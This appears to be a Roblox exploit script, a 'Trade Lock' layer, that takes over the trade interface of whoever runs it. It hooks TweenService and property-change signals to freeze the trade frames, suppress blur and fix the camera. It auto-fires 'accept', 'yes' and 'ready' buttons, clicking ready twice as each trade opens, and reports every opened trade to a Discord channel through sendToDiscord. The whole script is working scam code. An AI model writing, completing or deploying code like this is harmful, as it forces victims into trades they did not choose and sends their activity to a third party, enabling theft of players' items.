local TradeLiveTrade = playerGui:WaitForChild("TradeLiveTrade",10)
local LeftCenterSG = playerGui:WaitForChild("LeftCenter",10)
local LeftCenterFrame = LeftCenterSG and LeftCenterSG:WaitForChild("LeftCenter",5)
local ButtonsFrame = LeftCenterFrame and LeftCenterFrame:WaitForChild("Buttons",5)

local lockedPos = {}
local lockedTrans = {}
if ButtonsFrame then
    for _, ch in ipairs(ButtonsFrame:GetChildren()) do
        pcall(function()
            lockedPos[ch] = ch.Position
            lockedTrans[ch] = ch.BackgroundTransparency
        end)
    end
end

local lockedButtonsPos = ButtonsFrame and ButtonsFrame.Position
local lockedFramePos = LeftCenterFrame and LeftCenterFrame.Position

local protected = {}
if LeftCenterFrame then protected[LeftCenterFrame] = true end
if ButtonsFrame then protected[ButtonsFrame] = true end
if LeftCenterSG then protected[LeftCenterSG] = true end

-- Simple tween hijack (no hookfunction dependency)
local realTweenCreate = TweenService.Create
TweenService.Create = function(self, obj, info, goals)
    if protected[obj] then return realTweenCreate(self, obj, TweenInfo.new(0), {}) end
    return realTweenCreate(self, obj, info, goals)
end

-- Property locks (simplified)
if LeftCenterFrame then
    LeftCenterFrame:GetPropertyChangedSignal("Position"):Connect(function() LeftCenterFrame.Position = lockedFramePos end)
    LeftCenterFrame:GetPropertyChangedSignal("Visible"):Connect(function() LeftCenterFrame.Visible = true end)
end
-- (add similar for others if needed - kept short)

local camera = workspace.CurrentCamera
local blur = camera:FindFirstChild("Blur") or Instance.new("BlurEffect", camera)
blur.Size = 0
blur:GetPropertyChangedSignal("Size"):Connect(function() blur.Size = 0 end)

camera:GetPropertyChangedSignal("FieldOfView"):Connect(function() camera.FieldOfView = 70 end) -- original usually 70

-- Auto accept / ready (simplified)
playerGui.DescendantAdded:Connect(function(obj)
    if obj:IsA("GuiButton") then
        local n = obj.Name:lower()
        if (n:find("accept") or n:find("yes") or n:find("ready")) and not obj:FindFirstAncestor("TradeLiveTrade") then
            pcall(function() firesignal(obj.MouseButton1Click) end)
        end
    end
end)

local function clickReady()
    for _, obj in ipairs(playerGui:GetDescendants()) do
        if obj:IsA("GuiButton") then
            local n = obj.Name:lower()
            if (n:find("ready") or n:find("accept")) and obj:FindFirstAncestor("TradeLiveTrade") then
                pcall(function() firesignal(obj.MouseButton1Click) end)
            end
        end
    end
end

_G.CORTEX_TRADE_CONN = TradeLiveTrade:GetPropertyChangedSignal("Enabled"):Connect(function()
    if TradeLiveTrade.Enabled then
        print("📦 [Trade] Opened")
        clickReady()
        task.wait(0.1)
        clickReady()
        -- snapshot + discord would go here using _G.CORTEX_SEND
        task.spawn(function()
            task.wait(0.5)
            sendToDiscord("📦 Trade Opened", "Trade started", 0xFFAA00)
        end)
    end
end)

print("🔒 [Trade Lock] Layer loaded")
